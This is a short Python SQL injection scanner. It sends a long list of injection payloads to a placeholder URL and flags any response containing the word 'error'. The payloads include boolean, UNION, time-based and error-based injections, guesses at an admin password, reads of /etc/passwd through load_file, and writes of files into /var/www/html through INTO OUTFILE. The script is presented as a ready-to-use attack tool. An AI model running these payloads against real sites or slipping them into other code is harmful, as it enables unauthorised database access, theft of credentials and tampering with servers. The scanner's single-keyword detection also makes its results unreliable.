import requests

target_url = "Insert URL"


payloads = [
    
    "') OR 1=1 --",
    "') OR 1=0 AND '1'='1",
    "') OR 1=0 AND '1'='2",
    "') OR '1'='1",
    "') OR '1'='2",
    "') OR EXISTS (SELECT * FROM users) --",
    "') OR EXISTS (SELECT * FROM users WHERE '1'='2) --",
    "') OR (SELECT COUNT(*) FROM users) > 0 --",
    "') OR (SELECT COUNT(*) FROM users WHERE '1'='2) > 0 --",
    "') OR 1=1 UNION SELECT 1,2 --",
    "') OR 1=1 UNION SELECT 1,NULL,3 --",
    "') OR 1=1 UNION SELECT 1,2 INTO OUTFILE '/var/www/html/test.html' --",
    "') OR 1=1 UNION SELECT 1,2 INTO DUMPFILE '/var/www/html/test.bin' --",
    "') OR 1=1 UNION SELECT 1,load_file('/etc/passwd') --",

    
    "') OR SLEEP(5) --",
    "') OR IF(1=1,SLEEP(5),'0') --",
    "') OR IF(1=(SELECT COUNT(*) FROM information_schema.tables),SLEEP(5),'0') --",
    "') OR IF(1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='information_schema'),SLEEP(5),'0') --",
    "') OR IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users'),SLEEP(5),'0') --",
    "') OR IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users'),SLEEP(5),'0') --",
    "') OR IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password'),SLEEP(5),'0') --",

    
    "') OR 1/(SELECT COUNT(*) FROM users WHERE username='admin' AND password='') --",
    "') OR 1/(SELECT COUNT(*) FROM users WHERE username='admin' AND password IS NULL) --",
    "') OR 1/(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%') --",
    "') OR 1/(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%' LIMIT 1 OFFSET 1) --",
    "') OR 1/(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%' LIMIT 1 OFFSET 2) --",
    "') OR 1/(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%' LIMIT 1 OFFSET 3) --",
    "') OR 1/(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%' LIMIT 1 OFFSET 4) --",
    "') OR 1/(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%' LIMIT 1 OFFSET 5) --",

    
    "') OR 1=CONVERT(CHAR(78),7777777) --",
    "') OR 1=CONVERT(CHAR(78),(SELECT COUNT(*))) --",
    "') OR 1=CONVERT(CHAR(78),(SELECT COUNT(*) FROM users)) --",
    "') OR 1=CONVERT(CHAR(78),(SELECT COUNT(*) FROM users WHERE username='admin')) --",
    "') OR 1=CONVERT(CHAR(78),(SELECT COUNT(*) FROM users WHERE username='admin' AND password='pass')) --",
    "') OR 1=CONVERT(CHAR(78),(SELECT COUNT(*) FROM users WHERE username='admin' AND password=SUBSTRING(password,1,1))) --",
]


for payload in payloads:
    print(f"Testing payload: {payload}")
    response = requests.get(target_url + payload)
    if "error" in response.text.lower():
        print("[+] SQL Injection vulnerability detected!")
        print("Response:")
        print(response.text)
    else:
        print("[-] SQL Injection vulnerability not detected.")